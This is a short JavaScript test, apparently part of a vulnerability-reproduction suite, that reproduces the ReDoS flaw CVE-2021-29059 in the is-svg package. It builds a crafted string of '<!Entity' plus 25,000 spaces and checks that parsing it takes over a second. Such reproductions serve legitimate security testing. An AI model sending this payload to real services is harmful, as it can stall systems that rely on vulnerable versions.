//https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29059
test("ReDos in is-svg", () => {
  const genstr = require("./utils").genstr;
  const measureTime = require("./utils").measureTime;
  const isSvg = require("is-svg");

  let attack_str = "<!Entity" + genstr(25000, " ");

  let t = measureTime(function () {
    isSvg(attack_str);
  });

  let time = t[0] + t[1] / 1000000000;

  expect(time).toBeGreaterThan(1);
});
